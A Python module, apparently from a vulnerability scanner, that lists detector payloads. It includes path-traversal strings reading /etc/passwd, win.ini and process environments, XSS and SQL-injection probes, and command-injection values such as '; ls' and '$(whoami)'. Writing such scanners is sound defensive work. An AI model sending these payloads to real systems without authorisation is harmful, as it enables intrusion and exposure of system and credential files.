"""
Centralized payload definitions for various detectors
"""

PAYLOADS = {
    "lfi": [
        {
            "payload": "../../etc/passwd",
            "destructive": False,
            "description": "Linux passwd file traversal"
        },
        {
            "payload": "../../../etc/passwd",
            "destructive": False,
            "description": "Linux passwd file traversal (deeper)"
        },
        {
            "payload": "../../../../etc/passwd",
            "destructive": False,
            "description": "Linux passwd file traversal (very deep)"
        },
        {
            "payload": "..\\..\\..\\windows\\win.ini",
            "destructive": False,
            "description": "Windows win.ini traversal"
        },
        {
            "payload": "../../../../windows/win.ini",
            "destructive": False,
            "description": "Windows win.ini traversal (Unix style)"
        },
        {
            "payload": "/etc/passwd",
            "destructive": False,
            "description": "Absolute path to passwd"
        },
        {
            "payload": "c:\\windows\\win.ini",
            "destructive": False,
            "description": "Absolute Windows path"
        },
        {
            "payload": "....//....//....//etc/passwd",
            "destructive": False,
            "description": "Double encoding bypass"
        },
        {
            "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
            "destructive": False,
            "description": "URL encoded traversal"
        },
        {
            "payload": "/proc/self/environ",
            "destructive": False,
            "description": "Linux process environment"
        }
    ],
    "xss": [
        {
            "payload": "<script>alert(1)</script>",
            "destructive": False,
            "description": "Basic XSS"
        },
        {
            "payload": "<img src=x onerror=alert(1)>",
            "destructive": False,
            "description": "Image tag XSS"
        },
        {
            "payload": "'\"><script>alert(1)</script>",
            "destructive": False,
            "description": "Quote breaking XSS"
        }
    ],
    "sql": [
        {
            "payload": "' OR '1'='1",
            "destructive": False,
            "description": "Classic SQL injection"
        },
        {
            "payload": "1' AND '1'='1",
            "destructive": False,
            "description": "Boolean-based SQLi"
        },
        {
            "payload": "' UNION SELECT NULL--",
            "destructive": False,
            "description": "UNION-based SQLi"
        }
    ],
    "command_injection": [
        {
            "payload": "; ls",
            "destructive": False,
            "description": "Unix command chain"
        },
        {
            "payload": "| whoami",
            "destructive": False,
            "description": "Pipe command"
        },
        {
            "payload": "`id`",
            "destructive": False,
            "description": "Backtick command execution"
        },
        {
            "payload": "$(whoami)",
            "destructive": False,
            "description": "Command substitution"
        }
    ]
}
